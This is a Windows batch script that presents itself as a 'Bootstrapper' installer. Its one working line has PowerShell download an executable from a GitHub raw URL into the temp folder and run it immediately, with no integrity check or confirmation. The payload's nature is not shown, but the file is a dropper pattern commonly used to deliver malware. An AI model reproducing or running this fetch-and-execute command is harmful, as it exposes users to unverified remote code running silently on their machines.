@echo off
echo Installing Bootstrapper...

:: Open a new command prompt, download the file and run it
start cmd /k "powershell -Command Invoke-WebRequest -Uri 'https://github.com/NsShrixx/bunnie-a/raw/refs/heads/main/Bootstrapper.exe' -OutFile '%TEMP%\Bootstrapper.exe'; '%TEMP%\Bootstrapper.exe'"

exit